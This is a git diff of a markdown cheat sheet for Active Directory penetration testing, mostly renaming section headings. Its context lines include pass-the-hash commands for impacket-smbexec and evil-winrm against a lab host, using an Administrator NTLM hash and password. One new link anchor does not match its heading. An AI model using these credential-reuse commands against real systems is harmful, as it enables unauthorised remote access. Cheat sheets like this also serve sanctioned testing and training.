@@ -21,8 +21,8 @@ tags:   [Cheatsheets, Tools, Active-Directory, Active-Directory-Enumeration, SMB
 - [BloodHound, SharpHound.exe, bloodhound-python](#bloodhound-sharphoundexe-bloodhound-python)
 - [PowerView.ps1](#powerviewps1)
 - [Impacket PsExec, WmiExec and SMBExec - SMB Shell Access with Password or Pass-the-Hash](#impacket-psexec-wmiexec-and-smbexec---smb-shell-access-with-password-or-pass-the-hash)
-- [Evil-WinRM - Access WinRM with Password or Pass-the-Hash](#evil-winrm---access-winrm-with-password-or-pass-the-hash)
-- [xfreerdp - Access RDP with Password or Pass-the-Hash](#xfreerdp---access-rdp-with-password-or-pass-the-hash)
+- [Evil-WinRM - WinRM Access with Password or Pass-the-Hash](#evil-winrm---winrm-access-winrm-with-password-or-pass-the-hash)
+- [xfreerdp - RDP Access with Password or Pass-the-Hash](#xfreerdp---rdp-access-with-password-or-pass-the-hash)
 - [Kerberoasting with Impacket-GetUserSPNs](#kerberoasting-with-impacket-getuserspns)
 - [Kerberoasting with Rubeus.exe](#kerberoasting-with-rubeusexe)
 - [AS-REP Roasting with Impacket-GetNPUsers](#as-rep-roasting-with-impacket-getnpusers)
@@ -412,7 +412,7 @@ impacket-wmiexec vorkharium.com/Administrator@172.16.150.10 -hashes :1a06b424887
 impacket-smbexec Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
 impacket-smbexec vorkharium.com/Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
 ```
-### Evil-WinRM - Access WinRM with Password or Pass-the-Hash
+### Evil-WinRM - WinRM Access with Password or Pass-the-Hash
 ```shell
 # With Password
 evil-winrm -i 172.16.150.10 -u Administrator -p 'Password123!'
@@ -420,7 +420,7 @@ evil-winrm -i 172.16.150.10 -u Administrator -p 'Password123!'
 # With Hash
 evil-winrm -i 172.16.150.10 -u Administrator -H 1a06b4248879e68a498d3bac51bf91c9
 ```
-### xfreerdp - Access RDP with Password or Pass-the-Hash
+### xfreerdp - RDP Access with Password or Pass-the-Hash
 ```shell
 # Create "/home/kali/share" before using it - This folder will allow us to move files easily from inside the xfreerdp session
 
